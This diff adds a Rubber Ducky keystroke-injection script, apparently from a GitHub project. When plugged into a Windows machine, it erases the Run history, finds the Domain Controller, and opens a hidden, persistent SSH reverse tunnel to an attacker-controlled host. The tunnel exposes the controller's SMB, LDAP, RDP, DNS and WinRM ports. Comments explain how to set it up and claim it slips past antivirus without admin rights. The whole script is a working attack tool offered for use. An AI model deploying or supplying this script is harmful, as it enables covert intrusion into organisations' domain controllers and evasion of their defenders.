@@ -1,0 +1,43 @@
+REM | Win-SSH_DC_Tunnel.ducky.txt
+REM |
+REM | This is a script for the Rubber Ducky.
+REM | It will identity an active Domain Controller, then build an SSH reverse tunnel to the attacker, 
+REM | and giving the attacker network access to the Domain Controller.
+REM |
+REM | For setup, your attacker machine needs public IP ssh access with a user/password created for this purpose.
+REM | Once script is successful, you can access common DC ports on this machine, such as "curl localhost:10080"
+REM | (Common DC ports will have 10000 added to them, so SMB/445 will be at localhost:10445, etc)
+REM |
+REM | This script uses the built in SSH function that is installed by default on newer Win10 deployments.
+REM | Does not require admin access on victim, and generally will be allowed by Windows Defender or other antiviruses.
+REM | (However, this does not gain any shell access to victim machine)
+REM | Script also hides the powershell console, and SSH runs in the background indefinitely.
+REM |
+REM | See all "REM ~~" tilde lines below for code that needs to be modified!
+REM |
+REM | Written by JeffTadashi
+REM | https://github.com/JeffTadashi/omducky/
+REM |
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 2000
+REM | Command below erases the "Run" history. This is optional.
+STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+ENTER
+DELAY 2000
+REM | In CMD prompt, use "%logonserver:~2%" to get plain DC server name. 
+REM | In powershell, use "$env:LOGONSERVER.substring(2)", but must be variable substituted. Substitution is below
+STRING $D=$env:LOGONSERVER.substring(2)
+ENTER
+REM ~~ | Change username@IP to your attacking machine, on a public IP 
+STRING powershell -windowstyle hidden -command ssh -fN -o "StrictHostKeyChecking=no" -R 10053:"$D":53 -R 10080:"$D":80 -R 10389:"$D":389 -R 10445:"$D":445 -R 13389:"$D":3389 -R 15985:"$D":5985 ducky@10.20.30.40
+ENTER
+DELAY 2000
+REM ~~ | Change string below to the ssh user's password
+STRING S0meth1ng!
+ENTER
+
+
